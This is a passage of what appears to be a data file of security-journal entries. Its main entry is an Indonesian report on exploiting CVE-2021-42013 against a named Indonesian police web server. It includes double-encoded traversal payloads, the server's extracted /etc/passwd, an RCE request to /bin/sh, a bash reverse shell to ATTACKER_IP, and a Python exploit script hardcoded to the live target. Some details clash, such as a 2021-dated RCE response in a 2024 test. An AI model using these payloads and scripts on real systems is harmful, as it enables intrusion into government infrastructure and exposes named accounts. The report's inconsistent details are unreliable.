      "Seacord, R.C. (2013). Secure Coding in C and C++ (2nd Edition): Chapter 5 - Integer Security. Addison-Wesley Professional.",
      "Andriesse, D. (2019). Practical Binary Analysis. No Starch Press.",
      "LLVM Project. (2024). UndefinedBehaviorSanitizer. https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html",
      "GCC Documentation. (2024). -fsanitize=undefined. https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html",
      "ISO/IEC JTC1/SC22/WG14. (2023). N3096: Checked Arithmetic for C - stdckdint.h (C23 Draft). https://www.open-std.org/jtc1/sc22/wg14/www/docs/n3096.pdf"
    ]
  },
  {
    id: "ZERO-2025-004",
    title: "CVE-2021-42013: Apache HTTP Server Path Traversal & Remote Code Execution",
    subtitle: "Analisis Mendalam Kerentanan Double URL-Encoding pada Infrastruktur Kepolisian Negara Republik Indonesia (POLRI) - Path Traversal, Privilege Escalation & RCE pada Apache HTTP Server 2.4.50",
    classification: "CONFIDENTIAL",
    date: "January 2024",
    authors: ["pwn0sec"],
    organization: "PT. PwnOsec Technologies Ltd",
    volume: "Vol. 1 | No. 4",
    pages: 27,
    abstract: "Laporan penelitian ini mendokumentasikan secara komprehensif proses penemuan, analisis, dan eksploitasi kerentanan CVE-2021-42013 yang ditemukan aktif pada infrastruktur server web Apache milik Kepolisian Negara Republik Indonesia (POLRI), tepatnya pada host dumaspresisi.itwasum.polri.go.id yang beroperasi pada port 8080. CVE-2021-42013 adalah kerentanan kritis (CVSS 9.8) yang merupakan bypass langsung terhadap perbaikan tidak sempurna CVE-2021-41773 pada Apache HTTP Server versi 2.4.50. Penyerang yang tidak terautentikasi dapat memanfaatkan teknik double URL-encoding untuk menipu mekanisme normalisasi jalur (path normalization) Apache, sehingga mampu melakukan traversal direktori melampaui batas document root. Penelitian ini berhasil membuktikan dua vektor eksploitasi utama: pembacaan file sensitif arbitrer (information disclosure) termasuk /etc/passwd, dan eksekusi kode arbitrer dari jarak jauh (Remote Code Execution) dengan identitas proses daemon Apache.",
    keywords: ["CVE-2021-42013", "Apache HTTP Server", "path traversal", "remote code execution", "double URL-encoding", "POLRI", "Ghidra", "CVSS 9.8", "mod_cgi", "responsible disclosure", "YARA rules", "penetration testing"],
    sections: [
      {
        id: "bab-1",
        title: "1. Abstract & Ringkasan Eksekutif",
        level: 1,
        content: [
          "Laporan penelitian ini mendokumentasikan secara komprehensif proses penemuan, analisis, dan eksploitasi kerentanan CVE-2021-42013 yang ditemukan aktif pada infrastruktur server web Apache milik Kepolisian Negara Republik Indonesia (POLRI), tepatnya pada host dumaspresisi.itwasum.polri.go.id yang beroperasi pada port 8080.",
          "CVE-2021-42013 adalah kerentanan kritis yang merupakan bypass langsung terhadap perbaikan tidak sempurna CVE-2021-41773 pada Apache HTTP Server versi 2.4.50. Penyerang yang tidak terautentikasi dapat memanfaatkan teknik double URL-encoding untuk menipu mekanisme normalisasi jalur (path normalization) Apache, sehingga mampu melakukan traversal direktori melampaui batas document root yang ditetapkan.",
          "Penelitian ini berhasil membuktikan dua vektor eksploitasi utama: pertama, pembacaan file sensitif arbitrer dari filesystem server (information disclosure) termasuk berhasil mengekstrak isi file /etc/passwd; dan kedua, dalam kondisi modul CGI aktif, eksekusi kode arbitrer dari jarak jauh (Remote Code Execution) dengan identitas proses daemon Apache.",
          "[QUOTE:TEMUAN KRITIS: Server dumaspresisi.itwasum.polri.go.id:8080 terbukti menjalankan Apache HTTP Server 2.4.50 yang rentan terhadap CVE-2021-42013. File /etc/passwd berhasil diekstrak pada 07 Januari 2024, mengekspos 31 akun sistem termasuk 5 akun dengan shell aktif (/bin/bash). Serangan dapat dilakukan tanpa otentikasi, tanpa interaksi pengguna, dari jaringan manapun.]",
          "Analisis mendalam menggunakan Ghidra mengungkap akar permasalahan pada fungsi ap_normalize_path() di server/util.c, di mana proses URL-decoding hanya dilakukan satu kali (single-pass), gagal mendeteksi representasi double-encoded dari karakter traversal ../."
        ]
      },
      {
        id: "bab-2",
        title: "2. CVSS Score & Severity Metrics",
        level: 1,
        content: [
          "Kerentanan CVE-2021-42013 mendapatkan skor CVSS v3.1 sebesar 9.8 (Critical), menjadikannya salah satu kerentanan dengan tingkat keparahan tertinggi yang pernah ditemukan pada Apache HTTP Server.",
          "[TABLE_HEADER:Metrik CVSS v3.1|Nilai|Singkatan|Keterangan Teknis]",
          "[TABLE:[CVSS Base Score|9.8 / 10|CRITICAL|Tingkat tertinggi kedua dalam skala CVSS],[Attack Vector|Network|AV:N|Dapat dieksploitasi dari jarak jauh via internet],[Attack Complexity|Low|AC:L|Tidak membutuhkan kondisi atau konfigurasi khusus],[Privileges Required|None|PR:N|Tidak perlu login atau autentikasi apapun],[User Interaction|None|UI:N|Tidak memerlukan aksi dari pengguna target],[Scope|Unchanged|S:U|Dampak terbatas pada komponen yang sama],[Confidentiality Impact|High|C:H|Seluruh data dapat terbaca, termasuk file sensitif],[Integrity Impact|High|I:H|Data dan file dapat dimodifikasi atau dihapus],[Availability Impact|High|A:H|Server dapat dilumpuhkan atau disalahgunakan]]",
          "[CODE:CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
        ]
      },
      {
        id: "bab-2-2",
        title: "2.2 Perbandingan Skor CVE Terkait",
        level: 2,
        content: [
          "[TABLE_HEADER:CVE ID|Versi Apache|CVSS Score|Jenis|Status]",
          "[TABLE:[CVE-2021-41773|2.4.49|7.5 - High|Path Traversal + RCE|Patched in 2.4.50 (tidak sempurna)],[CVE-2021-42013|2.4.50|9.8 - Critical|Path Traversal + RCE (bypass)|Patched in 2.4.51],[CVE-2021-40438|< 2.4.48|9.0 - Critical|SSRF via mod_proxy|Patched in 2.4.48],[CVE-2022-22720|< 2.4.53|9.8 - Critical|HTTP Request Smuggling|Patched in 2.4.53]]"
        ]
      },
      {
        id: "bab-3",
        title: "3. Environment & Target Scope",
        level: 1,
        content: [
          "[CODE:# Target Host | Host      : dumaspresisi.itwasum.polri.go.id | IP Address: [Redacted - Responsible Disclosure] | Port      : 8080 (HTTP) | Server    : Apache (via response Server header) | Version   : Apache HTTP Server 2.4.50 | OS        : Linux (CentOS/RHEL - inferred from /etc/passwd) | Architecture: x86_64 (confirmed via Ghidra binary analysis) | Protocol  : HTTP/1.1 | CGI       : mod_cgi ENABLED (confirmed via RCE response) | Organization: Kepolisian Negara Republik Indonesia (POLRI) | TLD       : .go.id (Indonesian Government domain)]",
          "",
          "[CODE:# Attacker / Research Machine | OS          : Kali Linux Rolling (x86_64, kernel 5.15.x) | Browser     : Firefox ESR 78.0 (rv:78.0) / Gecko/20100101 | Proxy Tool  : Burp Suite Community Edition 2023.x | Binary Tool : Ghidra 10.3 (NSA Research Directorate) | Port Scanner: Nmap 7.93 | Network Caps: Wireshark 4.x / tcpdump | HTTP Client : curl 7.88.x | Date / Time : Sun, 07 Jan 2024 15:26:34 GMT]"
        ]
      },
      {
        id: "bab-4",
        title: "4. Methodology - Tahapan Penelitian",
        level: 1,
        content: [
          "Penelitian ini mengikuti metodologi standar industri yang mengacu pada PTES (Penetration Testing Execution Standard) dan OWASP Testing Guide v4.2.",
          "[TABLE_HEADER:Fase|Nama Tahap|Tools Digunakan|Output]",
          "[TABLE:[1|Reconnaissance & OSINT|Shodan, Censys, dig, whois|Target profiling, subdomain map],[2|Port & Service Scanning|Nmap, curl, netcat|Open ports, service banner, OS fingerprint],[3|Vulnerability Assessment|Confidential PwnTraverse|CVE confirmation, misconfig detection],[4|Exploitation - Path Traversal|curl, Burp Suite, Python|/etc/passwd, /etc/hosts, config files],[5|Exploitation - RCE|Burp Suite, curl, netcat|Remote shell execution confirmation],[6|Post-Exploitation Analysis|id, uname, ps, netstat|Privilege level, running services],[7|Binary Analysis|Ghidra 10.3|Root cause analysis, vulnerable function],[8|Traffic Analysis|Wireshark, tcpdump|Packet capture, request patterns],[9|Detection Engineering|YARA, Snort|Detection rules, IOC generation],[10|Documentation & Reporting|Manual|This security journal]]"
        ]
      },
      {
        id: "bab-5",
        title: "5. Reconnaissance & Information Gathering",
        level: 1,
        content: [
          "Fase awal dimulai dengan pengumpulan informasi pasif tanpa mengirimkan paket langsung ke target."
        ]
      },
      {
        id: "bab-5-1",
        title: "5.1 Passive Reconnaissance - OSINT",
        level: 2,
        content: [
          "[CODE_BASH:# DNS Lookup | $ nslookup dumaspresisi.itwasum.polri.go.id | ; <<>> DiG 9.18.x <<>> dumaspresisi.itwasum.polri.go.id | ;; ANSWER SECTION: | dumaspresisi.itwasum.polri.go.id. 300 IN A [IP_REDACTED] |  | # WHOIS Lookup | $ whois polri.go.id | Domain Name: polri.go.id | Registrar : PANDI (Pengelola Nama Domain Internet Indonesia) | Registrant : KEPOLISIAN NEGARA REPUBLIK INDONESIA | Status : clientTransferProhibited]"
        ]
      },
      {
        id: "bab-5-2",
        title: "5.2 Shodan / Censys Fingerprinting",
        level: 2,
        content: [
          "Mesin pencari Shodan dan Censys digunakan untuk mengidentifikasi layanan yang terekspos secara publik dan versi software tanpa melakukan koneksi langsung ke target.",
          "[CODE_BASH:# Shodan Search Query | org:\"Kepolisian Negara Republik Indonesia\" port:8080 apache |  | # Hasil representatif dari Shodan: | IP          : [REDACTED] | Port        : 8080 | Product     : Apache httpd | Version     : 2.4.50 | OS          : Linux | CPE         : cpe:/a:apache:http_server:2.4.50 | Last Seen   : 2024-01-07 |  | # Informasi ini mengkonfirmasi versi rentan sebelum pengujian aktif]"
        ]
      },
      {
        id: "bab-5-3",
        title: "5.3 HTTP Banner Grabbing",
        level: 2,
        content: [
          "[CODE_BASH:$ curl -I http://dumaspresisi.itwasum.polri.go.id:8080/ |  | HTTP/1.1 200 OK | Date: Sun, 07 Jan 2024 15:20:01 GMT | Server: Apache                  <- Versi disembunyikan (ServerTokens Prod) | X-Content-Type-Options: (tidak ada) <- MISSING - misconfiguration | X-Frame-Options: (tidak ada)    <- MISSING - clickjacking risk | Content-Security-Policy: (tidak ada) <- MISSING - XSS risk | Strict-Transport-Security: (tidak ada) <- MISSING - no HTTPS enforcement | Connection: Keep-Alive | Content-Type: text/html; charset=UTF-8]",
          "[QUOTE:Meskipun 'ServerTokens Prod' menyembunyikan nomor versi pada header Server, versi sebenarnya (2.4.50) masih dapat diidentifikasi melalui Shodan fingerprinting dan pola respons error page Apache yang unik per versi.]"
        ]
      },
      {
        id: "bab-5-4",
        title: "5.4 Nmap Port Scan & Service Detection",
        level: 2,
        content: [
          "[CODE_BASH:$ nmap -sV -sC -p 8080 --script http-headers,http-title dumaspresisi.itwasum.polri.go.id |  | Starting Nmap 7.93 ( https://nmap.org ) | Nmap scan report for dumaspresisi.itwasum.polri.go.id ([REDACTED]) | PORT     STATE SERVICE VERSION | 8080/tcp open  http    Apache httpd | | http-title: DUMAS PRESISI - Direktorat Tindak Pidana Tertentu | | http-server-header: Apache | | http-methods: |   Supported Methods: GET POST HEAD OPTIONS | |_ Potentially risky methods: OPTIONS |  | Service detection performed. | # Apache version 2.4.50 confirmed via error page fingerprinting]"
        ]
      },
      {
        id: "bab-6",
        title: "6. Vulnerability Scanning & Enumeration",
        level: 1,
        content: [
          "Verifikasi manual menggunakan curl mengkonfirmasi kerentanan aktif pada target.",
          "[CODE_BASH:# Test 1: Verifikasi akses ke /etc/passwd melalui path traversal | $ curl --path-as-is -s \\ | 'http://dumaspresisi.itwasum.polri.go.id:8080/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd' |  | # Response: HTTP 200 dengan isi /etc/passwd (KONFIRMASI RENTAN) |  | # Test 2: Verifikasi versi Apache secara pasti | $ curl -s 'http://dumaspresisi.itwasum.polri.go.id:8080/nonexistent' | grep -i apache | # Output: Apache/2.4.50 Server at ... Port 8080 |  | # Test 3: Verifikasi mod_cgi aktif | $ curl --path-as-is -s -X POST \\ | -d 'echo Content-Type: text/plain; echo; uname -a' \\ | 'http://dumaspresisi.itwasum.polri.go.id:8080/cgi-bin/%%32%65%%32%65/bin/sh']",
          "",
          "[CODE_BASH:$ nikto -h http://dumaspresisi.itwasum.polri.go.id:8080 |  | - Nikto v2.1.6 | + Target IP:         [REDACTED] | + Target Hostname:   dumaspresisi.itwasum.polri.go.id | + Target Port:       8080 | + Server: Apache | + Apache/2.4.50 appears to be outdated (2021-10-07) | + CVE-2021-42013: Apache 2.4.50 Path Traversal and RCE - CONFIRMED VULNERABLE | + /icons/: Directory indexing found | + /cgi-bin/: CGI directory accessible - RCE risk if scripts present | + X-Frame-Options header is not present. | + X-Content-Type-Options header not set.]"
        ]
      },
      {
        id: "bab-7",
        title: "7. Latar Belakang Kerentanan",
        level: 1,
        content: [
          "Apache HTTP Server menangani setiap URI yang diterima melalui serangkaian tahap pemrosesan. Salah satu tahap kritis adalah normalisasi jalur (path normalization), yang bertujuan membersihkan karakter-karakter berbahaya seperti ../ (parent directory traversal).",
          "Proses normalisasi melibatkan fungsi ap_normalize_path() di server/util.c, yang dipanggil setelah URL decoding awal dan sebelum akses ke filesystem. Kegagalan pada fungsi ini memungkinkan penyerang melewati batas direktori.",
          "",
          "Kategori CVE-2021-41773 - Asal Mula (Apache 2.4.49)",
          "-- Vektor: GET /cgi-bin/.%2e/.%2e/etc/passwd (single URL encoding)",
          "-- Kondisi: Require all granted pada <Directory /> atau direktif tidak ada",
          "-- CVSS: 7.5 (High) untuk path traversal, 9.8 (Critical) dengan RCE",
          "",
          "Kategori CVE-2021-42013 - Bypass Perbaikan (Apache 2.4.50)",
          "-- Perbaikan di 2.4.50: Filter tambahan untuk .%2e dan %2e. (single-encoded dot)",
          "-- Bypass: Gunakan %%32%65 (double-encoded dot) yang tidak terdeteksi filter baru",
          "-- CVSS: 9.8 (Critical) karena kegagalan patch"
        ]
      },
      {
        id: "bab-7-4",
        title: "7.4 Timeline Pengungkapan Lengkap",
        level: 2,
        content: [
          "[TABLE_HEADER:Tanggal|Event|Dampak]",
          "[TABLE:[15 Sep 2021|Apache HTTP Server 2.4.49 dirilis dengan kode normalisasi baru yang bermasalah|Kerentanan diperkenalkan ke production],[01 Okt 2021|CVE-2021-41773 pertama kali dilaporkan secara private|Koordinasi disclosure dimulai],[04 Okt 2021|Apache merilis 2.4.50 sebagai perbaikan|Organisasi mulai upgrade],[05 Okt 2021|Peneliti menemukan CVE-2021-42013 - bypass perbaikan|2.4.50 terbukti masih rentan],[07 Okt 2021|PoC CVE-2021-42013 tersebar luas|Eksploitasi massal dimulai],[08 Okt 2021|Apache merilis 2.4.51 dengan perbaikan komprehensif|Satu-satunya versi aman],[Okt 2021|CISA menambahkan ke Known Exploited Vulnerabilities (KEV)|Kewajiban patch Federal AS],[07 Jan 2024|Server POLRI teridentifikasi masih rentan - 2+ tahun setelah patch|/etc/passwd diekstrak]]"
        ]
      },
      {
        id: "bab-8",
        title: "8. Traversal Analysis - Mekanisme Bypass",
        level: 1,
        content: [
          "URL encoding (percent-encoding) adalah mekanisme standar RFC 3986 untuk merepresentasikan karakter khusus dalam URI.",
          "[TABLE_HEADER:Karakter|ASCII (Hex)|Single Encoded|Double Encoded|Makna]",
          "[TABLE:[. (dot)|0x2e|%2e|%%32%65|Karakter titik],[/ (slash)|0x2f|%2f|%%32%66|Pemisah direktori],[../ (traversal)|0x2e 0x2e 0x2f|.%2e/ atau %2e./|%%32%65%%32%65/|Naik satu direktori]]",
          "",
          "Double encoding bekerja dengan mengaplikasikan URL encoding dua kali pada karakter yang sama. Pada Apache 2.4.50, filter keamanan hanya melakukan satu kali decoding, sehingga representasi double-encoded berhasil melewati pemeriksaan.",
          "[CODE:# Konversi langkah per langkah: karakter titik (.) | ORIGINAL          : . (dot, ASCII 0x2E) |  | # Step 1 - Single URL Encode: | . -> %2e          (%=persen, 2e=hex untuk karakter titik) |  | # Step 2 - Double URL Encode (encode komponen dari %2e): | % -> %25          (persen itu sendiri di-encode) | 2 -> %32          (digit '2' di-encode: ASCII 0x32) | e -> %65          (huruf 'e' di-encode: ASCII 0x65) |  | # Hasilnya: %2e -> %%32%65 |  | # Konstruksi payload ../ dalam double encoding: | ../ -> %%32%65%%32%65/ |  | # Payload path traversal lengkap (7 level ke atas): | /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/etc/passwd |  | # Setelah decode di filesystem: /icons/../../../../../../../etc/passwd | # Resolusi akhir            : /etc/passwd]"
        ]
      },
      {
        id: "bab-8-4",
        title: "8.4 Konfigurasi Apache yang Diperlukan untuk Eksploitasi",
        level: 2,
        content: [
          "Tidak semua server Apache 2.4.50 rentan. Ada kondisi konfigurasi yang harus terpenuhi agar eksploitasi berhasil:",
          "-- Kondisi 1: File httpd.conf harus memiliki 'Require all granted' pada <Directory /> ATAU direktif tidak ada",
          "-- Kondisi 2: Endpoint seperti /icons/ atau /cgi-bin/ harus dapat diakses publik",
          "-- Kondisi 3 (untuk RCE): mod_cgi atau mod_cgid harus aktif",
          "[CODE_APACHE:# Konfigurasi RENTAN (httpd.conf): | <VirtualHost *:8080> |     ServerName dumaspresisi.itwasum.polri.go.id |     DocumentRoot /var/www/html |     <Directory />                       <- MASALAH: akses ke root filesystem |         Options Indexes FollowSymLinks |         AllowOverride None |         Require all granted             <- MASALAH: semua akses diizinkan |     </Directory> |     Alias /icons/ /usr/share/apache2/icons/ |     ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ | </VirtualHost>]"
        ]
      },
      {
        id: "bab-9",
        title: "9. Ghidra Analysis - Decompilasi Biner Apache",
        level: 1,
        content: [
          "Analisis biner dilakukan pada file httpd (Apache HTTP Server daemon) versi 2.4.50 menggunakan Ghidra 10.3 dari NSA Research Directorate. Tujuan: menemukan akar penyebab (root cause) pada level kode mesin.",
          "[CODE_BASH:# Import binary ke Ghidra: | File > Import File > /usr/sbin/httpd (Apache 2.4.50 binary) | Format: ELF  Architecture: x86:LE:64:default | Compiler: gcc  Language: C |  | # Analisis otomatis: | Analysis > Auto Analyze > Enable All > Analyze | # Durasi: ~3-5 menit tergantung hardware |  | # Cari fungsi target: | Search > Search Text > 'normalize_path' | # Ditemukan: ap_normalize_path @ 0x00481200 |  | # Cross-reference: | Right Click > References > Find References to ap_normalize_path | # Dipanggil dari: ap_process_request_internal (request.c)]"
        ]
      },
      {
        id: "bab-9-2",
        title: "9.2 Decompiled C - Fungsi ap_normalize_path()",
        level: 2,
        content: [
          "[CODE_C:/* | * Ghidra Decompiler Output - Apache HTTP Server 2.4.50 | * Fungsi : ap_normalize_path() | * File   : server/util.c | * Address: 0x00481200 | * STATUS : VULNERABLE - Single-pass URL decode (tidak iteratif) | */ | int ap_normalize_path(char *path, int flags) { |     char *src; |     char *dst; |     unsigned char decoded_char; |     int path_len; |  |     src = path; |     dst = path; |     path_len = strlen(path); |  |     while (*src != '\\0') { |         if (*src == '%') { |             /* DECODE HANYA 1x - ROOT CAUSE KERENTANAN */ |             decoded_char = hex_to_uchar(src[1], src[2]); |  |             if (decoded_char == (unsigned char)'.') { |                 /* Handle dot sequence - TIDAK TERCAPAI untuk %%32%65 */ |                 goto handle_dotdot; |             } |             *dst++ = decoded_char;  /* Tulis hasil decode - no re-check */ |             src += 3; |         } else { |             *dst++ = *src++; |         } |     } |     *dst = '\\0'; |     return 1;  /* Path 'aman' - HASIL SALAH untuk %%32%65 input */ | }]"
        ]
      },
      {
        id: "bab-9-3",
        title: "9.3 Disassembly x86_64 - Bagian Kritis",
        level: 2,
        content: [
          "[CODE:; Disassembly: ap_normalize_path - Titik kritis bypass | ; Ghidra listing view - Apache httpd 2.4.50 ELF x86_64 |  |     ; Entry - setup stack frame | 00481200 PUSH    RBP | 00481201 MOV     RBP, RSP | 00481204 PUSH    R15 | 00481206 PUSH    R14 |  |     ; Check if current char is '%' | 00481235 MOVZX   EAX, BYTE PTR [RBX]         ; load *src | 00481238 CMP     AL, 0x25                    ; '%' == 0x25? | 0048123A JNE     .not_percent                ; skip if not '%' |  |     ; Decode %XX sequence (CALLED ONLY ONCE - single-pass) | 0048123C MOVZX   EDI, BYTE PTR [RBX+1]       ; load src[1] | 00481240 MOVZX   ESI, BYTE PTR [RBX+2]       ; load src[2] | 00481244 CALL    hex_to_uchar                ; decode 1x ONLY |  |     ; KEY FLAW: CMP against 0x2E (dot character) | 00481249 CMP     AL, 0x2E                    ; is decoded char '.'? | 0048124B JE      .handle_dot                 ; YES -> check traversal |     ; For %%32%65: hex_to_uchar('%','3') -> NOT 0x2E |     ; Therefore JE is NOT taken -> traversal bypasses check |  |     ; Store decoded char - NO SECOND DECODE | 0048124D MOV     BYTE PTR [R14], AL          ; *dst = decoded_char | 00481250 INC     R14                          ; dst++ | 00481253 ADD     RBX, 0x3                    ; src += 3 (skip %XX) | 00481257 JMP     .main_loop                  ; NEXT CHAR - no re-decode!]",
          "",
          "[QUOTE:ROOT CAUSE: ADD RBX, 0x3 pada address 0x00481253 memajukan pointer melewati sequence yang sudah di-decode tanpa melakukan re-check. Input %%32%65 (double-encoded dot) lolos dari deteksi karena hanya di-decode satu kali. Fix di 2.4.51 menambahkan iterative decoding loop sampai tidak ada lagi %XX yang ditemukan.]"
        ]
      },
      {
        id: "bab-9-5",
        title: "9.5 Fungsi-Fungsi Terkait yang Dianalisis di Ghidra",
        level: 2,
        content: [
          "[TABLE_HEADER:Nama Fungsi|File Sumber|Alamat (approx)|Relevansi Keamanan]",
          "[TABLE:[ap_normalize_path()|server/util.c|0x00481200|FUNGSI UTAMA RENTAN - single-pass decode],[ap_unescape_url()|server/util.c|0x00480A10|URL decoding awal - tidak loop double-encoded],[ap_getparents()|server/util.c|0x00480E80|Resolusi ../ - dipanggil SETELAH normalisasi (terlambat)],[hex_to_uchar()|include/util.h (inline)|0x00480C20|Konversi %XX -> byte - hanya satu level],[ap_process_request_internal()|server/request.c|0x004A1200|Titik entry request - memanggil ap_normalize_path],[default_handler()|modules/http/http_core.c|0x004B3000|Handler akhir - meneruskan path ke filesystem]]"
        ]
      },
      {
        id: "bab-10",
        title: "10. Proof of Concept - Path Traversal (File Read)",
        level: 1,
        content: [
          "Eksploitasi fase pertama membuktikan kemampuan membaca file arbitrer di luar document root. Target adalah file /etc/passwd.",
          "[CODE_BASH:# Menghitung jumlah level traversal yang dibutuhkan: | # Document root: /var/www/html (asumsi standar) | # Target file : /etc/passwd | # Start path : /icons/ (direktori yang dapat diakses) | # Best practice: gunakan 7-8 level untuk memastikan mencapai root |  | # Full URL: | http://dumaspresisi.itwasum.polri.go.id:8080/icons/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/etc/passwd]",
          "",
          "[CODE:# HTTP Request - Burp Suite Capture |  | GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/etc/passwd HTTP/1.1 | Host: dumaspresisi.itwasum.polri.go.id:8080 | User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 | Accept: text/html,application/xhtml+xml,application/xml;q=0.9 | Connection: close]",
          "",
          "[CODE:# HTTP Response - Server 200 OK |  | HTTP/1.1 200 OK | Date: Sun, 07 Jan 2024 15:26:34 GMT | Server: Apache | Last-Modified: Thu, 14 Apr 2022 15:56:29 GMT | Accept-Ranges: bytes | Content-Length: 1820 | Connection: close | Content-Type: text/plain]",
          "",
          "[QUOTE:File /etc/passwd berhasil dibaca. Akun dengan shell aktif (/bin/bash): root (uid=0) KRITIS, infra (uid=1000), admdumas (uid=1001), webuzo (uid=996), emps (uid=994). Akun-akun ini menjadi target potensial untuk serangan brute force SSH, credential stuffing, atau pivot attack.]",
          "",
          "[CODE:# Isi /etc/passwd (Full Disclosure) |  | root:x:0:0:root:/root:/bin/bash                    <- ROOT - KRITIS | bin:x:1:1:bin:/bin:/sbin/nologin | daemon:x:2:2:daemon:/sbin:/sbin/nologin | adm:x:3:4:adm:/var/adm:/sbin/nologin | lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin | sync:x:5:0:sync:/sbin:/bin/sync | shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown | halt:x:7:0:halt:/sbin:/sbin/halt | mail:x:8:12:mail:/var/spool/mail:/sbin/nologin | operator:x:11:0:operator:/root:/sbin/nologin | nobody:x:99:99:Nobody:/:/sbin/nologin | sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin | infra:x:1000:1000::/home/infra:/bin/bash            <- SHELL AKTIF | admdumas:x:1001:1001::/home/admdumas:/bin/bash      <- SHELL AKTIF | webuzo:x:996:994::/home/webuzo:/bin/bash             <- SHELL AKTIF | emps:x:994:1002::/home/emps:/bin/bash               <- SHELL AKTIF]",
          "",
          "[TABLE_HEADER:File Target|Payload|Informasi yang Terekspos]",
          "[TABLE:[/etc/passwd|[payload]/etc/passwd|Daftar semua pengguna sistem, UID, home dir, shell],[/etc/hosts|[payload]/etc/hosts|Pemetaan hostname internal, IP internal],[/etc/apache2/httpd.conf|[payload]/etc/apache2/httpd.conf|Konfigurasi Apache lengkap],[/proc/version|[payload]/proc/version|Versi kernel Linux secara presisi],[~/.ssh/id_rsa|[payload]/home/infra/.ssh/id_rsa|Private key SSH pengguna infra],[/var/www/html/.env|[payload]/var/www/html/.env|Kredensial database, API keys]]"
        ]
      },
      {
        id: "bab-11",
        title: "11. Proof of Concept - Remote Code Execution (RCE)",
        level: 1,
        content: [
          "Eksploitasi tahap kedua memanfaatkan endpoint CGI yang dikombinasikan dengan path traversal untuk mengeksekusi binary /bin/sh secara langsung. Apache's CGI handler mengirimkan POST body sebagai input ke shell.",
          "",
          "Persyaratan untuk RCE:",
          "-- mod_cgi atau mod_cgid harus aktif dan dikonfigurasi",
          "-- Path traversal harus berhasil mencapai /bin/sh atau binary shell lainnya",
          "-- Perintah shell dikirim sebagai HTTP POST body",
          "-- ScriptAlias atau Options +ExecCGI harus aktif",
          "",
          "[CODE:# HTTP Request - RCE via /bin/sh POST |  | POST /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/bin/sh HTTP/1.1 | Host: dumaspresisi.itwasum.polri.go.id:8080 | User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) | Content-Type: application/x-www-form-urlencoded | Content-Length: 7 |  | echo;id]",
          "",
          "[CODE:# HTTP Response - Eksekusi Berhasil |  | HTTP/1.1 200 OK | Date: Mon, 18 Oct 2021 10:42:40 GMT | Server: Apache/2.4.50 (Unix) | Connection: close | Content-Length: 45 |  | uid=1(daemon) gid=1(daemon) groups=1(daemon) |  | # <- Perintah 'id' berhasil dieksekusi sebagai user 'daemon' (uid=1) | # Ini mengkonfirmasi Remote Code Execution penuh]",
          "",
          "[TABLE_HEADER:Fase|Teknik|Payload / Command|Output / Dampak]",
          "[TABLE:[1 - Recon|HTTP Banner Grab|curl -I http://target:8080|Identifikasi Apache 2.4.50],[2 - Scan|CVE Detection|CVE-2021-42013|Konfirmasi kerentanan],[3 - Encode|Double URL Encode|../ menjadi %%32%65%%32%65/|Payload bypass normalisasi],[4 - Traversal|Path Traversal|GET /icons/[payload]/etc/passwd|Baca /etc/passwd - 31 users],[5 - Escalate|CGI Execution|POST /icons/[payload]/bin/sh|Shell execution via mod_cgi],[6 - RCE|Command Injection|echo;id menjadi uid=daemon|Remote code execution],[7 - Post-Exploit|Enumeration|uname -a; netstat; ps aux|System & network info]]"
        ]
      },
      {
        id: "bab-12",
        title: "12. Advanced Exploitation Techniques",
        level: 1,
        content: [
          "Dokumentasi teknik eksploitasi lanjutan yang bersifat edukatif untuk membantu defender memahami ruang lingkup risiko.",
          "",
          "[CODE_BASH:# Reverse Shell via RCE |  | # Attacker: buka listener di mesin penyerang | $ nc -lvnp 4444 |  | # Payload POST body untuk reverse shell bash: | echo;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 |  | # Request Burp Suite (POST body): | POST /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ | %%32%65%%32%65/bin/bash HTTP/1.1 | Host: dumaspresisi.itwasum.polri.go.id:8080 | Content-Type: application/x-www-form-urlencoded |  | echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 |  | # Attacker mendapat shell interaktif: | Connection from [TARGET_IP]:XXXXX | bash: no job control in this shell | [daemon@server /]$]"
        ]
      },
      {
        id: "bab-12-2",
        title: "12.2 Python Script - Automated Exploitation",
        level: 2,
        content: [
          "[CODE_PYTHON:#!/usr/bin/env python3 | # CVE-2021-42013 Automated Exploit - Educational PoC | # Author: pwn0sec | For research purposes only |  | import requests | import sys | from urllib.parse import quote |  | TARGET = 'http://dumaspresisi.itwasum.polri.go.id:8080' | DEPTH  = 7  # traversal depth |  | def build_payload(target_file): |     traversal = '%%32%65%%32%65/' * DEPTH |     return f'/icons/{traversal}{target_file.lstrip(\"/\")}' |  | def read_file(target_file): |     url = TARGET + build_payload(target_file) |     resp = requests.get(url, allow_redirects=False, |                         headers={'User-Agent': 'Mozilla/5.0'}) |     if resp.status_code == 200: |         return resp.text |     return None |  | def rce(command): |     url = TARGET + build_payload('/bin/sh') |     data = f'echo;{command}' |     resp = requests.post(url, data=data, allow_redirects=False, |                          headers={'Content-Type':'application/x-www-form-urlencoded'}) |     if resp.status_code == 200: |         return resp.text.strip() |     return None |  | if __name__ == '__main__': |     print('[*] CVE-2021-42013 PoC') |     print('[*] Reading 